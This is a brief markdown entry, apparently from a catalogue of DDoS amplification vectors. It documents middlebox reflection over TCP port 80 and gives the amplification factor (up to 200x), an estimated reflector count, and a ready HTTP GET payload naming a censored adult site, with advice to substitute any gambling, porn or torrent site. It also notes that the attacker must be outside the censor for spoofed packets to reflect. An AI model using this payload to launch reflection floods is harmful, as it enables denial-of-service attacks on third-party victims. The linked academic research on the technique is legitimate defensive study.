# Middlebox

## Port: **80**

## Proto: **TCP**

## Amplification factor: **3x (200x for top 10k reflector)**

## Reflector count: ~90 milion (May, 2023)

---

### Payload

<pre>GET / HTTP/1.1\r\nHost: youporn.com\r\n\r\n</pre>

You can use any gambling, porn, torrent site instead youporn.com

### Response

<pre></pre>

### How does it work

- Some middleboxes do not perform handshake, allowing for reflection via spoofing.
- The attacker must be outside the censor, otherwise the packets will all be censored and lost.

Other links:

- https://github.com/breakerspace/weaponizing-censors
- https://geneva.cs.umd.edu/papers/usenix-weaponizing-ddos.pdf
